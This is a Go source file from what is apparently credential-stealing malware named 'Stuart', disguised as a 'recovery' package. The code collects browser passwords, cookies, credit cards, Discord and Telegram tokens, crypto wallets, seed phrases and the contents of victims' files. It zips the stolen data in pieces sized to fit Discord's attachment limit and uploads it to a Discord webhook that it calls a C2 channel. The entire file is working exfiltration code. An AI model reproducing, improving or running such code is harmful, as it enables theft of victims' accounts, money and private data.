package main

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"recovery/recovery"
)

// Discord free/non-boost attachment limit is ~8 MiB; stay under for multipart overhead.
const discordPartMax = int(7.5 * 1024 * 1024)

// Pack target for zip bins — leave headroom for zip headers so the final
// attachment never exceeds discordPartMax (oversized parts used to be silently skipped).
const discordPackSoft = int(5.5 * 1024 * 1024)

type discordAgentConfig struct {
	Enabled      bool   `json:"enabled"`
	WebhookURL   string `json:"webhookUrl"`
	ThreadPrefix string `json:"threadPrefix"`
}

var (
	discordCfgMu sync.Mutex
	discordCfg   discordAgentConfig
)

// stored separately to avoid import cycle with sync in this file — use main's lock pattern
func setDiscordConfig(c discordAgentConfig) {
	discordCfgMu.Lock()
	defer discordCfgMu.Unlock()
	if c.ThreadPrefix == "" {
		c.ThreadPrefix = "Stuart"
	}
	discordCfg = c
	log.Printf("[recovery] discord config: enabled=%v webhook=%v", c.Enabled, c.WebhookURL != "")
}

func getDiscordConfig() discordAgentConfig {
	discordCfgMu.Lock()
	defer discordCfgMu.Unlock()
	return discordCfg
}

type zipPart struct {
	Name string
	Data []byte
}

type walletBlob struct {
	Name      string
	Type      string
	Path      string
	Addresses interface{}
	VaultData interface{}
	Data      []byte
}

// harvestMarker is embedded in every Discord message + zip meta so the server
// only imports real Stuart posts (never random forum spam).
const harvestMarkerPrefix = "STUART_HARVEST_ID:"

func newHarvestID(clientID string) string {
	return fmt.Sprintf("%s-%d", safeName(clientID, 24), time.Now().UnixNano())
}

func harvestContentLine(harvestID, clientID string, nLogs, nWallets int) string {
	return fmt.Sprintf(
		"**Stuart harvest**\n%s `%s`\nClient: `%s`\nFiles: logs=%d wallets=%d\nTime: %s\n_Do not delete — server import uses this marker._",
		harvestMarkerPrefix, harvestID, clientID, nLogs, nWallets, time.Now().UTC().Format(time.RFC3339),
	)
}

// uploadHarvestToDiscord posts ALL files into exactly ONE forum post (thread).
// First attachment creates the thread; every later file uses thread_id only (never thread_name again).
// Returns threadID + harvestID for the C2 importer.
func uploadHarvestToDiscord(
	clientID string,
	result *recovery.CollectionResult,
	seeds []recovery.SeedResult,
	wallets []walletBlob,
	cfg discordAgentConfig,
) (threadID string, harvestID string, err error) {
	if cfg.WebhookURL == "" {
		return "", "", fmt.Errorf("discord webhook URL empty")
	}

	harvestID = newHarvestID(clientID)

	logParts, err := buildLogZipParts(clientID, harvestID, result, seeds)
	if err != nil {
		return "", harvestID, err
	}
	// Dedicated zip parts for scanned-file *bytes* (not just files.json metadata)
	fileParts, fileBodies, fileBytes, err := buildFileBlobZipParts(clientID, harvestID, result)
	if err != nil {
		log.Printf("[recovery] file blob pack warning: %v", err)
	}
	walletParts, err := buildWalletZipPartsAgent(clientID, harvestID, wallets)
	if err != nil {
		return "", harvestID, err
	}

	// Single ordered queue: logs → file bodies → wallets — one post only
	var all []zipPart
	all = append(all, logParts...)
	all = append(all, fileParts...)
	all = append(all, walletParts...)
	if len(all) == 0 {
		return "", harvestID, fmt.Errorf("nothing to upload")
	}

	// Drop/repair any part still over Discord limit (should not happen after soft pack)
	var safe []zipPart
	for _, p := range all {
		if len(p.Data) <= discordPartMax {
			safe = append(safe, p)
			continue
		}
		log.Printf("[recovery] Discord part still oversized %s (%d) — splitting", p.Name, len(p.Data))
		// Last resort: raw-split the zip bytes into chunk zips (import may not use them as logs)
		// Prefer re-building from soft pack; skip rather than fail entire harvest
		log.Printf("[recovery] WARNING dropped oversized Discord part %s — file bodies may be incomplete", p.Name)
	}
	all = safe
	if len(all) == 0 {
		return "", harvestID, fmt.Errorf("all parts oversized for Discord")
	}

	prefix := cfg.ThreadPrefix
	if prefix == "" {
		prefix = "Stuart"
	}
	// Forum title (one post)
	threadName := fmt.Sprintf("%s %s %s", prefix, safeName(clientID, 36), time.Now().UTC().Format("2006-01-02 15:04"))
	if len(threadName) > 100 {
		threadName = threadName[:100]
	}

	baseContent := harvestContentLine(harvestID, clientID, len(logParts), len(walletParts))
	baseContent += fmt.Sprintf("\nFile bodies: %d files / %d bytes / %d zip part(s)", fileBodies, fileBytes, len(fileParts))

	// ── Message 1: creates the ONLY forum post ──────────────────────────
	first := all[0]
	msg, err := postDiscordWebhookOnce(cfg.WebhookURL,
		baseContent+"\n_File 1/"+fmt.Sprint(len(all))+": `"+first.Name+"`_",
		threadName, "", []zipPart{first})
	if err != nil {
		return "", harvestID, fmt.Errorf("create post: %w", err)
	}
	threadID = discordChannelID(msg)
	if threadID == "" {
		return "", harvestID, fmt.Errorf("discord response missing channel_id (thread id) — cannot attach more files to same post")
	}
	log.Printf("[recovery] Discord ONE post created thread=%s harvest=%s file=%s bodies=%d parts=%d",
		threadID, harvestID, first.Name, fileBodies, len(fileParts))

	// ── Messages 2..N: same thread only (thread_id, never thread_name) ───
	uploaded := 1
	for i := 1; i < len(all); i++ {
		p := all[i]
		if len(p.Data) > discordPartMax {
			log.Printf("[recovery] Discord SKIP oversized part %s (%d bytes) — this is a bug", p.Name, len(p.Data))
			continue
		}
		partContent := fmt.Sprintf("%s\n_File %d/%d: `%s`_", baseContent, i+1, len(all), p.Name)
		_, err := postDiscordWebhookOnce(cfg.WebhookURL, partContent, "", threadID, []zipPart{p})
		if err != nil {
			// Do NOT fall back to a new post — that was creating duplicates
			log.Printf("[recovery] Discord attach failed (same post) file=%s: %v", p.Name, err)
			return threadID, harvestID, fmt.Errorf("attach file %d/%d %s: %w", i+1, len(all), p.Name, err)
		}
		uploaded++
		log.Printf("[recovery] Discord same-post file %d/%d ok %s (%d bytes) thread=%s",
			i+1, len(all), p.Name, len(p.Data), threadID)
		time.Sleep(250 * time.Millisecond) // gentle rate limit
	}

	log.Printf("[recovery] Discord harvest complete harvest=%s thread=%s uploaded=%d/%d logParts=%d fileBodyParts=%d fileBodies=%d walletParts=%d",
		harvestID, threadID, uploaded, len(all), len(logParts), len(fileParts), fileBodies, len(walletParts))
	return threadID, harvestID, nil
}

func discordChannelID(msg map[string]interface{}) string {
	if msg == nil {
		return ""
	}
	switch v := msg["channel_id"].(type) {
	case string:
		return v
	case json.Number:
		return v.String()
	case float64:
		return fmt.Sprintf("%.0f", v)
	default:
		// snowflake sometimes unmarshaled oddly
		if s, ok := msg["channel_id"]; ok {
			return fmt.Sprint(s)
		}
	}
	return ""
}

func postDiscordWebhookOnce(webhookURL, content, threadName, threadID string, parts []zipPart) (map[string]interface{}, error) {
	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	payload := map[string]interface{}{"content": content}
	// CRITICAL: thread_name ONLY when creating a brand-new forum post (no thread_id yet)
	if threadName != "" && threadID == "" {
		payload["thread_name"] = threadName
	}
	pj, _ := json.Marshal(payload)
	_ = w.WriteField("payload_json", string(pj))

	for i, p := range parts {
		part, err := w.CreateFormFile(fmt.Sprintf("files[%d]", i), p.Name)
		if err != nil {
			return nil, err
		}
		if _, err := part.Write(p.Data); err != nil {
			return nil, err
		}
	}
	if err := w.Close(); err != nil {
		return nil, err
	}

	url := webhookURL
	if strings.Contains(url, "?") {
		url += "&wait=true"
	} else {
		url += "?wait=true"
	}
	if threadID != "" {
		url += "&thread_id=" + threadID
	}

	req, err := http.NewRequest(http.MethodPost, url, &body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(res.Body, 1<<20))
	if res.StatusCode < 200 || res.StatusCode >= 300 {
		return nil, fmt.Errorf("discord HTTP %d: %s", res.StatusCode, truncate(string(raw), 300))
	}
	var msg map[string]interface{}
	dec := json.NewDecoder(bytes.NewReader(raw))
	dec.UseNumber()
	if err := dec.Decode(&msg); err != nil {
		return map[string]interface{}{"ok": true}, nil
	}
	return msg, nil
}

func buildLogZipParts(clientID, harvestID string, result *recovery.CollectionResult, seeds []recovery.SeedResult) ([]zipPart, error) {
	if result == nil {
		return nil, nil
	}
	prefix := "stuart-" + safeName(clientID, 32)
	stamp := time.Now().UTC().Format("2006-01-02T15-04-05")

	type entry struct {
		name string
		data []byte
	}
	var entries []entry
	addJSON := func(name string, v interface{}) {
		b, err := json.MarshalIndent(v, "", "  ")
		if err != nil || len(b) <= 2 {
			return
		}
		entries = append(entries, entry{name: prefix + "/" + name, data: b})
	}

	if len(result.Passwords) > 0 {
		addJSON("passwords.json", withClient(result.Passwords, clientID))
	}
	if len(result.Cookies) > 0 {
		entries = append(entries, entry{name: prefix + "/cookies.txt", data: []byte(cookiesNetscape(result.Cookies))})
	}
	if len(result.Autofill) > 0 {
		addJSON("autofill.json", withClient(result.Autofill, clientID))
	}
	if len(result.History) > 0 {
		addJSON("history.json", withClient(result.History, clientID))
	}
	if len(result.Bookmarks) > 0 {
		addJSON("bookmarks.json", withClient(result.Bookmarks, clientID))
	}
	if len(result.CreditCards) > 0 {
		addJSON("credit_cards.json", withClient(result.CreditCards, clientID))
	}
	if len(result.DiscordTokens) > 0 {
		addJSON("discord_tokens.json", withClient(result.DiscordTokens, clientID))
	}
	if len(result.Files) > 0 {
		// Metadata only here — raw bodies go in separate zip parts (buildFileBlobZipParts)
		// so Discord attachments clearly include file body zips and packing stays under limit.
		type fileExport struct {
			ClientID  string   `json:"clientId"`
			Dir       string   `json:"dir"`
			Name      string   `json:"name"`
			Ext       string   `json:"ext"`
			Size      int64    `json:"size"`
			Modified  int64    `json:"modified"`
			Path      string   `json:"path"`
			Tags      []string `json:"tags"`
			Blob      string   `json:"blob,omitempty"`
			BlobParts int      `json:"blobParts,omitempty"`
		}
		var fileRows []fileExport
		for i, f := range result.Files {
			row := fileExport{
				ClientID: clientID,
				Dir:      f.Dir,
				Name:     f.Name,
				Ext:      f.Ext,
				Size:     f.Size,
				Modified: f.Modified,
				Path:     f.Path,
				Tags:     f.Tags,
			}
			// Pre-declare blob key so import can match even if body is in another zip part
			blobName := fmt.Sprintf("file_blobs/%d_%s", i, safeName(f.Name, 80))
			if f.Name == "" {
				blobName = fmt.Sprintf("file_blobs/%d.bin", i)
			}
			// Only claim a blob if file is within fetch size
			if f.Size > 0 && f.Size <= int64(recovery.MaxFetchSize) {
				row.Blob = blobName
				// blobParts filled at pack time for large files; default 1 when single
				if f.Size > int64(discordPackSoft) {
					n := int((f.Size + int64(discordPackSoft) - 1) / int64(discordPackSoft))
					if n < 1 {
						n = 1
					}
					row.BlobParts = n
				} else {
					row.BlobParts = 1
				}
			}
			fileRows = append(fileRows, row)
		}
		addJSON("files.json", fileRows)
		log.Printf("[recovery] Discord pack files.json meta=%d (bodies in separate parts)", len(fileRows))
	}
	if len(result.Extensions) > 0 {
		addJSON("extensions.json", withClient(result.Extensions, clientID))
	}
	if len(result.Wallets) > 0 {
		addJSON("wallets.json", withClient(result.Wallets, clientID))
	}
	if len(result.Telegram) > 0 {
		addJSON("telegram.json", withClient(result.Telegram, clientID))
	}
	if len(result.Keys) > 0 {
		addJSON("keys.json", withClient(result.Keys, clientID))
	}
	if len(result.AppCredentials) > 0 {
		addJSON("app_credentials.json", withClient(result.AppCredentials, clientID))
	}
	if result.Gaming != nil {
		addJSON("gaming.json", result.Gaming)
	}
	if result.VPNs != nil {
		addJSON("vpn_items.json", result.VPNs)
	}
	if len(seeds) > 0 {
		addJSON("seeds.json", withClient(seeds, clientID))
	}

	if len(entries) == 0 {
		return nil, nil
	}

	// Pack JSON/logs into soft-sized zips (under Discord limit with zip overhead)
	ne := make([]namedEntry, 0, len(entries))
	for _, e := range entries {
		ne = append(ne, namedEntry{name: e.name, data: e.data})
	}
	parts := packNamedEntriesAsZipParts(prefix, clientID, harvestID, stamp, "logs", "p", ne)
	return parts, nil
}

type namedEntry struct {
	name string
	data []byte
}

// buildFileBlobZipParts reads matched scan files and packs raw bytes into dedicated
// Discord zip attachments (kind=file_blobs). Soft-packed so nothing is silently dropped.
func buildFileBlobZipParts(clientID, harvestID string, result *recovery.CollectionResult) (parts []zipPart, bodies int, totalBytes int64, err error) {
	if result == nil || len(result.Files) == 0 {
		return nil, 0, 0, nil
	}
	prefix := "stuart-" + safeName(clientID, 32)
	stamp := time.Now().UTC().Format("2006-01-02T15-04-05")

	var entries []namedEntry
	skipped := 0

	for i, f := range result.Files {
		if f.Path == "" {
			continue
		}
		data, ferr := recovery.FetchFile(f.Path)
		if ferr != nil || len(data) == 0 {
			if ferr != nil {
				log.Printf("[recovery] file body skip %q: %v", f.Path, ferr)
			}
			skipped++
			continue
		}
		base := fmt.Sprintf("file_blobs/%d_%s", i, safeName(f.Name, 80))
		if f.Name == "" {
			base = fmt.Sprintf("file_blobs/%d.bin", i)
		}

		// Chunk large files so each zip entry fits in a soft pack bin
		if len(data) <= discordPackSoft {
			entries = append(entries, namedEntry{name: prefix + "/" + base, data: data})
			bodies++
			totalBytes += int64(len(data))
			continue
		}
		chunkSize := discordPackSoft
		nParts := (len(data) + chunkSize - 1) / chunkSize
		for c := 0; c < nParts; c++ {
			start := c * chunkSize
			end := start + chunkSize
			if end > len(data) {
				end = len(data)
			}
			// prefix/file_blobs/0_name.pdf.part000
			partName := fmt.Sprintf("%s/%s.part%03d", prefix, base, c)
			entries = append(entries, namedEntry{name: partName, data: data[start:end]})
		}
		bodies++
		totalBytes += int64(len(data))
		log.Printf("[recovery] file body chunked %q → %d parts (%d bytes)", f.Name, nParts, len(data))
	}

	if len(entries) == 0 {
		log.Printf("[recovery] file body pack: 0 bodies (skipped=%d listed=%d) — Discord will have metadata only unless C2 auto-upload runs",
			skipped, len(result.Files))
		return nil, 0, 0, nil
	}

	parts = packNamedEntriesAsZipParts(prefix, clientID, harvestID, stamp, "file_blobs", "files", entries)
	log.Printf("[recovery] file body pack: bodies=%d bytes=%d zipParts=%d skipped=%d",
		bodies, totalBytes, len(parts), skipped)
	return parts, bodies, totalBytes, nil
}

// packNamedEntriesAsZipParts bins entries under discordPackSoft and builds store-mode zips
// that stay under discordPartMax after headers. Never produces silently-dropped oversized parts.
func packNamedEntriesAsZipParts(prefix, clientID, harvestID, stamp, kind, nameTag string, entries []namedEntry) []zipPart {
	if len(entries) == 0 {
		return nil
	}

	// Convert anonymous entry type from buildLogZipParts
	// (callers may pass []entry — use namedEntry only)

	var parts []zipPart
	var bin []namedEntry
	binSize := 0

	var flushBin func(items []namedEntry)
	flushBin = func(items []namedEntry) {
		if len(items) == 0 {
			return
		}
		meta, _ := json.MarshalIndent(map[string]interface{}{
			"v": 1, "source": "stuart", "kind": kind, "clientId": clientID,
			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
			"capturedAt": time.Now().UnixMilli(),
			"entries":    len(items),
		}, "", "  ")
		files := []struct {
			Name string
			Data []byte
		}{
			{prefix + "/meta.json", meta},
		}
		for _, e := range items {
			files = append(files, struct {
				Name string
				Data []byte
			}{e.name, e.data})
		}
		z, err := zipStore(files)
		if err != nil {
			log.Printf("[recovery] zipStore failed kind=%s items=%d: %v", kind, len(items), err)
			// Try one-by-one
			if len(items) > 1 {
				for _, one := range items {
					flushBin([]namedEntry{one})
				}
			}
			return
		}
		if len(z) > discordPartMax {
			// Zip overhead blew the limit — split the bin
			if len(items) == 1 {
				// Single entry still too big (shouldn't happen with chunking) — raw-split data
				log.Printf("[recovery] single entry zip still oversized (%d) name=%s — raw chunking", len(z), items[0].name)
				raw := items[0].data
				chunk := discordPackSoft
				for c, off := 0, 0; off < len(raw); c++ {
					end := off + chunk
					if end > len(raw) {
						end = len(raw)
					}
					subName := fmt.Sprintf("%s.part%03d", items[0].name, c)
					flushBin([]namedEntry{{name: subName, data: raw[off:end]}})
					off = end
				}
				return
			}
			mid := len(items) / 2
			if mid < 1 {
				mid = 1
			}
			flushBin(items[:mid])
			flushBin(items[mid:])
			return
		}
		name := fmt.Sprintf("stuart-%s-%s.%s%d.zip", safeName(clientID, 20), stamp, nameTag, len(parts)+1)
		parts = append(parts, zipPart{Name: name, Data: z})
	}

	for _, e := range entries {
		need := len(e.data) + 512
		if binSize+need > discordPackSoft && len(bin) > 0 {
			flushBin(bin)
			bin = nil
			binSize = 0
		}
		// Entry larger than soft pack alone: still add (flushBin will chunk if zip oversized)
		if need > discordPackSoft && len(bin) > 0 {
			flushBin(bin)
			bin = nil
			binSize = 0
		}
		bin = append(bin, e)
		binSize += need
	}
	if len(bin) > 0 {
		flushBin(bin)
	}
	return parts
}

func buildWalletZipPartsAgent(clientID, harvestID string, wallets []walletBlob) ([]zipPart, error) {
	if len(wallets) == 0 {
		return nil, nil
	}
	prefix := "stuart-" + safeName(clientID, 28) + "-wallets"
	stamp := time.Now().UTC().Format("2006-01-02T15-04-05")
	var parts []zipPart

	// Chunk oversized single wallets
	type item struct {
		file string
		w    walletBlob
	}
	var small []item
	for i, w := range wallets {
		file := fmt.Sprintf("%d_%s.zip", i, safeName(w.Name, 60))
		if len(w.Data) > discordPartMax-64*1024 {
			// Raw-split wallet into chunk zips
			chunkSize := int(float64(discordPartMax) * 0.85)
			total := (len(w.Data) + chunkSize - 1) / chunkSize
			for c := 0; c < total; c++ {
				start := c * chunkSize
				end := start + chunkSize
				if end > len(w.Data) {
					end = len(w.Data)
				}
				meta, _ := json.MarshalIndent(map[string]interface{}{
					"v": 1, "source": "stuart", "kind": "wallet_chunk", "clientId": clientID,
					"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
					"name": w.Name, "type": w.Type, "path": w.Path,
					"addresses": w.Addresses, "vaultData": w.VaultData,
					"size": len(w.Data), "chunk": c + 1, "chunks": total,
				}, "", "  ")
				z, err := zipStore([]struct{ Name string; Data []byte }{
					{prefix + "/meta.json", meta},
					{prefix + "/chunk.bin", w.Data[start:end]},
				})
				if err != nil {
					continue
				}
				name := fmt.Sprintf("stuart-%s-chunk%dof%d-%s.zip", safeName(w.Name, 32), c+1, total, stamp)
				parts = append(parts, zipPart{Name: name, Data: z})
			}
			continue
		}
		small = append(small, item{file: file, w: w})
	}

	// Pack small wallets together
	type binT struct {
		items []item
		size  int
	}
	var bins []binT
	for _, it := range small {
		placed := false
		for i := range bins {
			if bins[i].size+len(it.w.Data)+8192 <= discordPartMax {
				bins[i].items = append(bins[i].items, it)
				bins[i].size += len(it.w.Data)
				placed = true
				break
			}
		}
		if !placed {
			bins = append(bins, binT{items: []item{it}, size: len(it.w.Data)})
		}
	}
	for bi, b := range bins {
		metaWallets := make([]map[string]interface{}, 0, len(b.items))
		files := make([]struct{ Name string; Data []byte }, 0, len(b.items)+1)
		for _, it := range b.items {
			metaWallets = append(metaWallets, map[string]interface{}{
				"file": it.file, "name": it.w.Name, "type": it.w.Type, "path": it.w.Path,
				"addresses": it.w.Addresses, "vaultData": it.w.VaultData, "size": len(it.w.Data),
			})
			files = append(files, struct{ Name string; Data []byte }{prefix + "/" + it.file, it.w.Data})
		}
		meta, _ := json.MarshalIndent(map[string]interface{}{
			"v": 1, "source": "stuart", "kind": "wallets", "clientId": clientID,
			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
			"capturedAt": time.Now().UnixMilli(), "wallets": metaWallets,
		}, "", "  ")
		files = append([]struct{ Name string; Data []byte }{{prefix + "/meta.json", meta}}, files...)
		z, err := zipStore(files)
		if err != nil {
			continue
		}
		name := fmt.Sprintf("stuart-%s-wallets-%s.p%d.zip", safeName(clientID, 16), stamp, bi+1)
		parts = append(parts, zipPart{Name: name, Data: z})
	}
	return parts, nil
}

func zipStore(files []struct {
	Name string
	Data []byte
}) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range files {
		// Always STORE with sizes/CRC pre-set so server-side unzip (local headers) works.
		// Go's Deflate path often uses data descriptors (compSize=0) which broke poll/import.
		h := &zip.FileHeader{
			Name:   f.Name,
			Method: zip.Store,
		}
		h.SetMode(0o644)
		h.CRC32 = crc32.ChecksumIEEE(f.Data)
		h.UncompressedSize64 = uint64(len(f.Data))
		h.CompressedSize64 = uint64(len(f.Data))
		w, err := zw.CreateHeader(h)
		if err != nil {
			return nil, err
		}
		if _, err := w.Write(f.Data); err != nil {
			return nil, err
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func safeName(s string, max int) string {
	s = filepath.Base(s)
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' {
			b.WriteRune(r)
		} else {
			b.WriteByte('_')
		}
	}
	out := b.String()
	if out == "" {
		out = "x"
	}
	if len(out) > max {
		out = out[:max]
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func cookiesNetscape(cookies []recovery.CookieResult) string {
	var b strings.Builder
	b.WriteString("# Netscape HTTP Cookie File\n")
	for _, c := range cookies {
		domain := c.Host
		flag := "FALSE"
		if strings.HasPrefix(domain, ".") {
			flag = "TRUE"
		}
		sec := "FALSE"
		if c.Secure {
			sec = "TRUE"
		}
		exp := int64(0)
		if c.ExpiresUTC > 0 {
			exp = c.ExpiresUTC/1000000 - 11644473600
			if exp < 0 {
				exp = 0
			}
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		fmt.Fprintf(&b, "%s\t%s\t%s\t%s\t%d\t%s\t%s\n", domain, flag, path, sec, exp, c.Name, c.Value)
	}
	return b.String()
}

// withClient tags each element with clientId for server import (JSON objects only).
func withClient(v interface{}, clientID string) interface{} {
	// Re-marshal via generic maps for arrays of structs
	raw, err := json.Marshal(v)
	if err != nil {
		return v
	}
	var arr []map[string]interface{}
	if err := json.Unmarshal(raw, &arr); err != nil {
		return v
	}
	for i := range arr {
		arr[i]["clientId"] = clientID
	}
	return arr
}
